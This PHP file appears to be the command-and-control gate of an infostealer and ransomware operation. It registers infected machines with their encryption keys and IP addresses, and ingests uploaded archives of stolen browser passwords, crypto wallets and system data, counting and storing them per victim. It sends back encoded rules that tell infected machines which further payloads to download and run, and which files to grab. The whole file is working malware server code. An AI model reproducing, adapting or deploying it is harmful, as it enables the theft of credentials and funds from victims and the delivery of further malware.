<?php
// -------------------------------------------------------------------------
// db
require_once ('db.php');

// -------------------------------------------------------------------------
// Include geoip data
require($GLOBALS['panel_folder'].'/GeoIP/geoip.php');
if (isset($_GET['hello'])){
	$TIP = $_SERVER["REMOTE_ADDR"];//$_SERVER["HTTP_X_REAL_IP"]; 
	$Country = ip_code($TIP) == "?" ? "UNK" : ip_code($TIP);
	if ($TIP == "::1"){
		$TIP = "localhost";
	}
	$RIP = "";
	$RCNTRY = "";
	$Computername = "";
	$Username = "";
	$OSVer = "";
	$Key = "";
	if (isset($_GET['ri'])){
		$RIP = $_GET['ri'];		
		$RCNTRY = ip_code($RIP) == "?" ? "UNK" : ip_code($RIP);
	}
	if (isset($_GET['cn'])){
		$Computername = $_GET['cn'];
	}
	if (isset($_GET['un'])){
		$Username = $_GET['un'];
	}
	if (isset($_GET['ov'])){
		$OSVer = $_GET['ov'];
	}
	if (isset($_GET['mi'])){
		$MachineID = $_GET['mi'];
	}
	if (isset($_GET['kx'])){
		$Key = $_GET['kx'];
	}
	$unix = $PDO->query("SELECT UNIX_TIMESTAMP()")->fetchColumn(0);
	$DateAdded = date("m-d-Y, h:i A", $unix);
	$myresp =  $MachineID." ".$TIP." ".$Country." ".$Username." ".$Computername." ".$Key." ".$OSVer." ".$DateAdded;
	//file_put_contents("pass.file", $myresp);
	//echo "data: 'hi'";
	//$_log = R::findOne('crypted','machine_id LIKE ?', [$MachineID]);
	$exs = $PDO->prepare("SELECT COUNT(*) FROM `crypted` WHERE `machine_id` = :h");
	$exs->execute(array(":h" => $MachineID));
	if ($exs->fetchColumn(0) == "0")
	{
		$in = $PDO->prepare("INSERT INTO crypted (id, machine_id, real_ip, real_country, tor_ip, tor_country, username, compname, os_version, enckey, date_added) VALUES(NULL, :m, :r, :q, :i, :c, :u, :n, :o, :k, :d)");
        $in->execute(array(":m" => $MachineID, ":r" => $RIP, ":q" => $RCNTRY, ":i" => $TIP, ":c" => $Country, ":u" => $Username, ":n" => $Computername, ":o" => $OSVer, ":k" => $Key, ":d" => $DateAdded));
	//	echo $myresp;
	}else{
	//	echo "NONO";
	}
	
	// $_log = R::dispense('crypted');
	// $_log->machine_id = $MachineID;
	// $_log->ip = $IP;
	// $_log->country = $Country;
	// $_log->username = $Username;
	// $_log->compname = $Computername;
	// $_log->os_version = $OSVer;
	// $_log->enckey = $Key;
	// $_log->date_added  = $DateAdded;
	
	// R::store($_log);
	//file_put_contents("complete.txt", "");
	//die();
}else{
	$IP = $_SERVER["REMOTE_ADDR"];//$_SERVER["HTTP_X_REAL_IP"]; 
	if ($IP == "::1"){
		$IP = "localhost";
		$Country="Unknown";
	}else{
		$Country = ip_code($IP) == "?" ? "UNK" : ip_code($IP);
	}

	$DateAdded = date("Y-m-d H_i_s");

	$FileName = $Country . "_" .$IP. "_" .$DateAdded. "_" .$_FILES['file']['name'];

	$File = $GLOBALS['panel_folder'].'/'.$GLOBALS['logspath']."/".basename($FileName);

// -------------------------------------------------------------------------
// upload file to server
	if (move_uploaded_file($_FILES['file']['tmp_name'], $File))
	{

		$zip = new ZipArchive;
		
		if($_FILES['file']['size'] == 0)
		{
			exit(0);
		}
		
		// -------------------------------------------------------------------------
		// file successful load to server
		if ($zip->open(realpath($File)) === TRUE) 
		{
			// -------------------------------------------------------------------------  
			// user info
			$system = $zip->getFromName("system.txt");
			$sysinfo = explode("\n", $system);
			
			$MachineID = substr($sysinfo[21], 11);
			
			// -------------------------------------------------------------------------
			// dublicate check  
			$settings = R::load('settings', 1);  
			if($settings["dublicates"] == "0")
			{
			if ((R::count( 'log', ' id_machine = ? ', [$MachineID] ))>0)
			{
				unlink(realpath($File));
				exit(0);
			}
			}
			
			// -------------------------------------------------------------------------
			// Add network info into system.txt
			$system = str_ireplace("IP?", $IP, $system);
			$system = str_ireplace("Country?", $Country, $system);
			
			$zip->addFromString('system.txt', $system);
			
			// -------------------------------------------------------------------------
			// Stats
			$passwords = $zip->getFromName("passwords.txt");
			$CountPass = substr_count($passwords, "SOFT:");
			$CountCrypto = 0;
			$CountPlugins = 0;
			


			// -------------------------------------------------------------------------
			// top sites count
			$sites = explode("\n", $passwords);
			
			foreach($sites as $line)
			{
				$l = substr($line, 0, 6);
				
				if($l == "HOST: ")
				{
					$url = parse_url(substr($line, 6));
					
					$url_r = $url['host'];
					
					$site  = R::findOne( 'topsites', ' url = ? ', [ $url_r ] );
					if ($site != NULL)
					{
						$site->count_r = $site["count_r"]+1;
						R::store($site);
					}
					else
					{
						$site = R::dispense('topsites');
						$site->url = $url_r;
						$site->count_r = 1;
						R::store($site);
					}
				}
			}
			// -------------------------------------------------------------------------
			// chromium passwords count
			$CountChromium = substr_count($passwords, ": Google Chrome") +
				substr_count($passwords, ": Chrome") +
				substr_count($passwords, ": Chromium") +
				substr_count($passwords, ": Kometa") +
				substr_count($passwords, ": Amigo") +
				substr_count($passwords, ": Torch") +
				substr_count($passwords, ": Orbitum") +
				substr_count($passwords, ": Comodo Dragon") +
				substr_count($passwords, ": Nichrome") +
				substr_count($passwords, ": Maxthon5") +
				substr_count($passwords, ": Sputnik") +
				substr_count($passwords, ": EPB") +
				substr_count($passwords, ": Vivaldi") +
				substr_count($passwords, ": CocCoc Browser") +
				substr_count($passwords, ": Uran Browser") +
				substr_count($passwords, ": QIP Surf") +
				substr_count($passwords, ": Cent") +
				substr_count($passwords, ": Elements Browser") +
				substr_count($passwords, ": TorBrowser");
			
			// -------------------------------------------------------------------------
			// firefox passwords count
			$CountFirefox = substr_count($passwords, ": Mozilla Firefox") +
				substr_count($passwords, ": Pale Moon") +
				substr_count($passwords, ": Waterfox") +
				substr_count($passwords, ": Cyberfox") +
				substr_count($passwords, ": Black Hawk") +
				substr_count($passwords, ": IceCat") +
				substr_count($passwords, ": Firefox") +
				substr_count($passwords, ": K-Meleon");
			
			// -------------------------------------------------------------------------
			// other passwords count
			$CountIE = substr_count($passwords, ": InternetExplorer");
			$CountEdge = substr_count($passwords, ": Edge");
			$CountOpera = substr_count($passwords, ": Opera");
			
			// -------------------------------------------------------------------------
			// add in db
			$temp = R::findOne('browsers', 'name = ?', ['Chromium']);
			$temp->count_c = $temp["count_c"]+$CountChromium;
			R::store($temp);
			
			$temp = R::findOne('browsers', 'name = ?', ['Firefox']);
			$temp->count_c = $temp["count_c"]+$CountFirefox;
			R::store($temp);
			
			$temp = R::findOne('browsers', 'name = ?', ['IE']);
			$temp->count_c = $temp["count_c"]+$CountIE;
			R::store($temp);
			
			$temp = R::findOne('browsers', 'name = ?', ['Edge']);
			$temp->count_c = $temp["count_c"]+$CountEdge;
			R::store($temp);
			
			$temp = R::findOne('browsers', 'name = ?', ['Opera']);
			$temp->count_c = $temp["count_c"]+$CountOpera;
			R::store($temp);
			
			// -------------------------------------------------------------------------
			// cc and crypto count
			$countFilesInLog = $zip->numFiles;
			
			for ($i = 0; $i < $countFilesInLog; $i++)
			{
				$stat = $zip->statIndex($i);
				$found = strripos($stat['name'], "Wallets/");
				
				if($found === false){}else
				{
					$CountCrypto++;
				}
			}
			
			// -------------------------------------------------------------------------
			// crypto plugins count
			$countFilesInLog = $zip->numFiles;
			
			for ($i = 0; $i < $countFilesInLog; $i++)
			{
				$stat = $zip->statIndex($i);
				$found = strripos($stat['name'], "Plugins/");
				
				if($found === false){}else
				{
					$CountPlugins++;
				}
			}
			
			// -------------------------------------------------------------------------
			// dublicate check
			
			
			$dublicate = 0;
			
			if ((R::count( 'log', ' id_machine = ? ', [$MachineID] ))>0)
			{
				$dublicate++;
			}
			// -------------------------------------------------------------------------
			// Add log info in db
			
			$passwords = mb_convert_encoding($passwords,"UTF-8");
			$system = mb_convert_encoding($system,"UTF-8");
			
			$log = R::dispense('log');
			
			$log->id_machine = $MachineID;
			$log->count_pwds = $CountPass;
			$log->ip = $IP;
			$log->country = $Country;
			$log->add_date = $DateAdded;
			$log->count_crpt = $CountCrypto;
			$log->count_plugins = $CountPlugins;
			$log->path = $FileName;
			$log->dublicate = $dublicate;
			R::store($log);
			
			$_log = R::findOne('log','add_date LIKE ? AND id_machine LIKE ? ', [$DateAdded,$MachineID]);
			
			$_log->text_pwds = $passwords;
			$_log->text_sys  = $system;
			
			R::store($_log);
			
			if($Country != "UNK")
			{
			$stat_country = R::findOne ('statistics_countries', ' code = ? ', [$Country]);
			$stat_country->count_c = $stat_country["count_c"]+1;
			R::store($stat_country);
			}
			
			// -------------------------------------------------------------------------
			// generate loader request link|load_to|startup_param|
			
			$request_string = "";		
			$rules = R::findAll('loader');
			
			foreach ($rules as $rule)
			{
				$stat = 0;
				if($rule['is_active'] == "1")
				{
					if($rule['cold_wallets'] == "0" || ($rule['cold_wallets'] == "1" && $CountCrypto != "0"))
					{

							$_pwds = explode(',', $rule["pwds"]);
							foreach ($_pwds as $_pwd)
							{
								if(strpos($passwords, $_pwd))
								{
									$stat = 1;
								}
							}
							if($rule['pwds'] == "")
							{
								$stat = 1;
							}
							if ($stat == 1)
							{
								$request_string .= $rule['file_path']."|";
								$request_string .= $rule['load_to']."|";
								if ($rule['startup_param'] == "")
								{
									$request_string .= " |";
								}
								else 
								{
									$request_string .= $rule['startup_param']."|";
								}
							}

					}
				}
			}

				
			
			
			echo base64_encode($request_string);
			
			
			
			
		}
		
		$zip->close();
		echo "Complete";
	// -------------------------------------------------------------------------
	}
	else
	{
	// -------------------------------------------------------------------------
		// generate grab request name|max_size|path|formats|exceptions|recursively|
		
		$request_string = "";		
		$rules = R::findAll('grabrule');
		
		foreach ($rules as $rule)
		{
			if ($rule['is_active'] == '1')
			{
				$request_string .= $rule['name']."|";
				$request_string .= $rule['max_size']."|";
				$request_string .= $rule['path']."|";
				$request_string .= $rule['formats']."|";
				$request_string .= $rule['recursively']."|";
			}					
		}
		echo base64_encode($request_string);
		
	}
}
?>